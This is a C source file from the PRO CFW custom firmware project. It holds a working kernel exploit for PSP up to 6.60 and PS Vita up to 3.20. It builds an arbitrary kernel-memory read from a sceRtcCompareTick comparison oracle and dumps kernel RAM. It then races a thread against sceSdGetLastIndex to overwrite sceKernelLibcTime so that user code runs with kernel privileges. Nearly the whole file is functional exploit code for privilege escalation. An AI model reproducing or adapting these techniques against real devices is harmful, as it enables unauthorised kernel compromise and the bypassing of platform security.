/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <sdk.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <psputility_savedata.h>
#include <module2.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include <string.h>
#include "kxploit.h"

/*
 sceSdGetLastIndex Kernel Exploit for PSP up to 6.60 and PS Vita up to 3.20, both PSP and PSX exploits
*/

// Vita 3.20
//#define LIBC_TIME_ADDR 0x8800F71C

// PSP 6.60
//#define LIBC_TIME_ADDR 0x8800F798

// PSP 5.03
//#define LIBC_TIME_ADDR 0x8800F030

#define KRAM_BACKUP_SIZE (128*1024)

UserFunctions* g_tbl;

int (* _sceSdGetLastIndex)(int a1, int a2, int a3) = (void *)NULL;
int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;

unsigned int (* _sceKernelCpuSuspendIntr)() = (void*)NULL;
void (* _sceKernelCpuResumeIntr)(unsigned int flags) = (void*)NULL;

int savedata_open = 0;

volatile u32 packet[256];
volatile int is_exploited;

u32 patch_addr = 0;
u32 patch_inst = 0;

int (*_sceRtcCompareTick)(u64*, u64*);

// input: 4-byte-aligned kernel address to a 64-bit integer
// return *addr >= value;
int is_ge_u64(uint32_t addr, uint32_t *value) {
	return (int)_sceRtcCompareTick((uint64_t *)value, (uint64_t *)addr) <= 0;
}

// sceRtcCompareTick kernel exploit by davee, implementation by CelesteBlue
// input: 4-byte-aligned kernel address
// return *addr
uint64_t kread64(uint32_t addr) {
	uint32_t value[2] = {0, 0};
	uint32_t res[2] = {0, 0};
	int bit_idx = 0;
	for (; bit_idx < 32; bit_idx++) {
		value[1] = res[1] | (1 << (31 - bit_idx));
		if (is_ge_u64(addr, value))
			res[1] = value[1];
	}
	value[1] = res[1];
	bit_idx = 0;
	for (; bit_idx < 32; bit_idx++) {
		value[0] = res[0] | (1 << (31 - bit_idx));
		if (is_ge_u64(addr, value))
			res[0] = value[0];
	}
	return *(uint64_t*)res;
}

void dump_kram(u32* dst, u32* src, u32 size) {
    u32 count = 0;
    while (count < size){
        u64 ret = kread64((u32)src);
        dst[0] = ((uint32_t *)&ret)[1];
        dst[1] = ((uint32_t *)&ret)[0];
        dst += 2;
        src += 2;
        count += 8;
    }
}

u32 FindFunctionFromUsermode(const char *library, u32 nid, u32 start_addr, u32 end_addr)
{
    u32 addr = start_addr;
    
    if (addr) {
        u32 maxaddr = end_addr;
        for (; addr < maxaddr; addr += 4) {
            if (strcmp(library, (const char *)addr) == 0) {
                
                u32 libaddr = (addr-start_addr-4) + 0x88000000;

                while (*(u32*)(addr -= 4) != libaddr) {
                    if (addr <= start_addr){
                        return 0;
                    }
                };

                u32 exports = (u32)(*(u16*)(addr + 10) + *(u8*)(addr + 9));
                u32 jump = exports * 4;

                addr = *(u32*)(addr + 12);
                addr -= 0x88000000;
                addr += start_addr;

                while (exports--) {
                    if (*(u32*)addr == nid){
                        return *(u32*)(addr + jump);
                    }
                    addr += 4;
                }

                return 0;
            }
        }
    }
    return 0;
}

void executeKernel(u32 kernelContentFunction)
{
    _sceKernelLibcTime(0x08800000, kernelContentFunction|0x80000000);
}

void repairInstruction(KernelFunctions* k_tbl){
    _sw(patch_inst, patch_addr); // recover the damage we've done
}

void KernelFunction()
{
    is_exploited = 1;
}

int stubScanner(UserFunctions* tbl){

    g_tbl = tbl;

    // thread and interrupt functions
    _sceKernelCpuSuspendIntr = g_tbl->KernelCpuSuspendIntr;
    _sceKernelCpuResumeIntr = g_tbl->KernelCpuResumeIntr;

    // vulnerable functions
    _sceRtcCompareTick = g_tbl->FindImportUserRam("sceRtc", 0x9ED0AE87);
    g_tbl->p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);
    _sceSdGetLastIndex = (void*)g_tbl->FindImportUserRam("sceChnnlsv", 0xC4C494F8);
    if (_sceSdGetLastIndex == NULL){
        _sceSdGetLastIndex = (void*)g_tbl->FindImportVolatileRam("sceChnnlsv", 0xC4C494F8);
    }
    // the function we need to patch
    _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);

    g_tbl->KernelDcacheWritebackAll();

    SceUID memid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, "", PSP_SMEM_High, KRAM_BACKUP_SIZE, NULL);
    void* kram_copy = g_tbl->KernelGetBlockHeadAddr(memid);
    dump_kram(kram_copy, 0x88000000, KRAM_BACKUP_SIZE);

    u32 libctime_addr = FindFunctionFromUsermode("UtilsForUser", 0x27CC57F0, (u32)kram_copy, (u32)kram_copy + KRAM_BACKUP_SIZE);
    u32 libctime_offset = libctime_addr - 0x88000000;
    
    patch_addr = libctime_addr+4;
    patch_inst = *(u32*)( (u32)kram_copy + libctime_offset + 4 );

    g_tbl->KernelFreePartitionMemory(memid);

    return (
        _sceKernelCpuSuspendIntr == NULL ||
        _sceKernelCpuResumeIntr == NULL ||
        _sceSdGetLastIndex == NULL ||
        _sceKernelLibcTime == NULL
    );
}

// the threads that will make sceSdGetLastIndex vulnerable
int qwik_thread()
{
    while (is_exploited != 1) {
        packet[9] = patch_addr - 18 - (u32)packet;
        g_tbl->KernelDelayThread(0);
    }

    return 0;
}

int doExploit()
{

    is_exploited = 0;

    // we create the thread and constantly attempt the exploit
    SceUID qwikthread = g_tbl->KernelCreateThread("qwik thread", qwik_thread, 0x11, 0x1000, THREAD_ATTR_USER, NULL);
    g_tbl->KernelStartThread(qwikthread, 0, NULL);

    while (is_exploited != 1) {
        packet[9] = (u32)16;
        _sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
        g_tbl->KernelDelayThread(0);
        _sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
        g_tbl->KernelDcacheWritebackAll();
    }

    return 0;
}
